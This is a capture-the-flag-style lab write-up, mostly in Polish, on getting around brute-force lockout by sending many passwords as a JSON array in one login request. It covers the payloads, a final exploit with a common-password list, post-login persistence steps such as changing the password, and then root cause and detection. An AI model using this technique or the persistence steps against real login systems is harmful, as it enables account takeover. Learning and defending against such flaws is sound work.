```md
LAB: Broken brute-force protection, multiple credentials per request
Kategoria: Authentication / Brute-force / Logic flaw
Utworzono: 2026-05-28 13:05 (Europe/Amsterdam)

---

1. SCAN (Entry & Signals)

   Endpoint:

   * POST /login

   Controllable input:

   * username
   * password
   * JSON structure
   * session cookie

   Signals:

   * lockout po 5 błędnych próbach
   * komunikat:

     * "You have made too many incorrect login attempts. Please try again in 1 minute(s)."
   * JSON request zamiast classic form-urlencoded
   * backend akceptuje array w polu password
   * zmiana username nie zmienia zachowania lockout

---

2. LOCK (Vector)

   Vector:

   * multiple credentials per request

   Why this:

   * backend prawdopodobnie liczy request jako pojedynczą próbę logowania zamiast liczby sprawdzonych credentiali

---

3. PRESS (Exact Steps)

   Step 1 – Potwierdzenie lockout

   Wysyłaj błędne loginy:

   POST /login

   {
   "username":"wiener",
   "password":"wrong"
   }

   Po 5 próbach:

   * pojawia się lockout

---

Step 2 – Test zmiany username

Zmieniaj username:

* test1
* test2
* test3

Obserwacja:

* lockout nadal aktywuje się po tej samej liczbie requestów

---

Step 3 – Test parsera JSON

Wyślij request z arrayem:

{
"username":"carlos",
"password":[
"test1",
"test2"
]
}

Obserwacja:

* backend nie zwraca parse error
* request zostaje zaakceptowany

---

Step 4 – Test iteracji credentiali

Wyślij:

{
"username":"wiener",
"password":[
"wrongpass",
"peter"
]
}

Wynik:

* login successful
* 302 redirect do:

  * /my-account?id=wiener

Wniosek:

* backend iteruje po elementach arraya

---

Step 5 – Test lockout counting

Wyślij jeden request zawierający wiele błędnych haseł:

{
"username":"wiener",
"password":[
"wrong1",
"wrong2",
"wrong3",
"wrong4",
"wrong5",
"wrong6",
"wrong7",
"wrong8",
"wrong9",
"wrong10"
]
}

Obserwacja:

* brak natychmiastowego lockout

Wniosek:

* wiele credentiali liczone jako jeden request/auth attempt

---

Step 6 – Final exploit

Wyślij listę popularnych haseł:

{
"username":"carlos",
"password":[
"123456",
"password",
"qwerty",
...
]
}

Wynik:

* 302 redirect
* login jako carlos

➜ LAB SOLVED

---

4. BREAK (Proof)

   Potwierdzone:

   * backend iteruje po wielu hasłach w jednym requestcie
   * lockout nie liczy każdego credential pair osobno
   * możliwy brute-force bypass

   Dowody:

   * 302 redirect po poprawnym haśle w arrayu
   * brak lockout mimo wielu błędnych credentiali w jednym requestcie

---

5. POST (Exploit Path)

   Step 1 – Login jako target

   * konto:

     * carlos

   Step 2 – Sprawdzenie możliwości eskalacji

   * inne usernames
   * admin
   * privileged accounts

   Step 3 – Persistence

   * zmiana hasła
   * dodanie recovery methods
   * aktywna sesja

---

6. ROOT CAUSE

   Backend:

   * interpretuje cały HTTP request jako pojedynczą próbę logowania
   * iteruje po credentialach wewnątrz requestu

   Problem:

   * rate limiting oparty o request count
   * brak liczenia realnych credential verification attempts

   Trust break:

   * HTTP request ≠ pojedyncza próba auth

---

7. PATTERN (Reusable)

   Name:

   * Interpretation mismatch
   * Multiple credentials per request
   * Broken brute-force protection

   Conditions:

   * JSON/API login
   * rate limiting
   * batch-like parsing
   * parser akceptujący arraye / multi-value input
   * auth flow iterujący po danych wejściowych

---

8. PITFALLS (My mistakes)

   * początkowe skupienie na brute-force zamiast modelu backendu
   * zbyt szybkie założenie:

     * "request accepted" = "backend iteruje"
   * brak rozróżnienia:

     * parser acceptance vs credential iteration
   * zbyt mocne wnioski przed testem rozdzielającym hipotezy

---

9. DETECTION (Fast trigger)

   Sygnały:

   * lockout po liczbie requestów
   * JSON auth endpoint
   * nietypowe zachowanie rate limiting
   * backend akceptuje array/list values
   * różnica między credential count a request count

   Testy:

   * zmiana username
   * array w polu password
   * poprawne hasło w różnych pozycjach arraya
   * wiele błędnych haseł w jednym requestcie

---

10. REPLAY (🔥 EXEC)

11. znajdź:

    * POST /login

12. potwierdź:

    * lockout po 5 błędnych requestach

13. sprawdź:

    * czy zmiana username wpływa na lockout

14. wyślij:

    * array w polu password

15. potwierdź:

    * backend iteruje po credentialach

16. wyślij:

    * dużą listę popularnych haseł

17. obserwuj:

    * 302 redirect
    * nowe session cookie
    * /my-account?id=carlos

---

11. TAKEAWAY

Backend błędnie definiował jednostkę próby logowania.

System liczył:

* HTTP request

zamiast:

* real credential verification attempts

Efekt:

* możliwy brute-force bypass przez batchowanie wielu haseł w jednym requestcie.
```
